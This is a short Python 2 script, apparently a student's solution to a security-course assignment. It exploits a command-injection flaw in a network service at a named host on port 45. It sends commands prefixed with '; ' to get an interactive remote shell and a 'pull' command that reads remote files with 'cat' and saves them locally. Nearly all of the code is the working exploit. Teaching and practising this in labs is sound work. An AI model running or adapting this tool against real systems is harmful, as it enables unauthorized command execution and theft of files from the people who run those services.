"""
    Use the same techniques such as (but not limited to):
        1) Sockets
        2) File I/O
        3) raw_input()

    from the OSINT HW to complete this assignment. Good luck!
"""

import socket
import time
host = "cornerstoneairlines.co" # IP address here
port = 45 # Port here


def display_help():
    help_txt =  "shell Drop into an interactive shell and allow users to gracefully exit\npull <remote-path> <local-path> Download files\nhelp Shows this help menu\nquit Quit the shell"

    print(help_txt)

def execute_pull(cmd):
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((host,port))
    time.sleep(2)
    data = s.recv(1024)

    string_to_send = "; cat " + cmd.split(" ")[1] + "\n"
    s.send(string_to_send)
    time.sleep(2)
    data = s.recv(4000)
    
    f = open(cmd.split(" ")[2],"w")
    f.write(data)
    f.close
    
def execute_cmd():
    

    directory = "/"
    cmd = raw_input(directory + "> ")
    
    while(cmd != "exit"):
        cmd_str = "; "+ cmd + "\n"
        if (cmd.split(" ")[0] == "cd"):
            if (len(cmd.split(" ")) != 2):
                directory = "home"

                cmd = raw_input(directory + "> ")
            else:
                new_dir ="" + directory + cmd.split(" ")[1]
                directory = new_dir
                cmd = raw_input(directory + "> ")
        else:       
            # Establish socket connection
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, port))
            time.sleep(2)
  
            # Reading:
            data = s.recv(1024)     # Receives 1024 bytes from IP/Port

        
            s.send(cmd_str)   # Send a newline \n at the end of your command
            time.sleep(4)
            data = s.recv(1024)
            print(data)
        
            cmd = raw_input(directory +"> ")
    
if __name__ == '__main__':
    cmd = raw_input("> ")
    while(cmd != "quit"):
        if (cmd == "shell"):
            execute_cmd()
        if (cmd.split(" ")[0] == "pull"):
            execute_pull(cmd)
        if(cmd == "help"):
            display_help()
        cmd = raw_input("> ")

